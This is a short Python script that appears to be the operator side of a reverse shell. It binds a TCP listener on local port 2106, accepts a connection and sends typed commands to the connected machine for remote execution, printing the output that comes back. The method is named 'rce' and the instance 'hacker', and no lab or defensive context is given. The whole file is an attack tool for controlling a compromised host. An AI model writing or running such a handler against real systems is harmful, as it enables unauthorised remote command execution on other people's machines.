import socket
from signal import signal, SIGPIPE, SIG_DFL
signal(SIGPIPE,SIG_DFL)
class Listener():
    def __init__(self, port, IP):
        self.IP = IP
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.IP, self.port))
        self.socket.listen(5)
        print(f"Listening on port {self.port}")
    def rce(self):  
        client, address = self.socket.accept()
        print(f'[*] Accepted connection from {address[0]}:{address[1]}')
        while True:
            cmd = input("$ ")
            client.send(cmd.strip().encode())
            stdout = client.recv(1024)
            if cmd.strip() == 'exit':
                break
            if not stdout:
                continue
            print(stdout.decode())

hacker = Listener(2106, "127.0.0.1")
hacker.rce()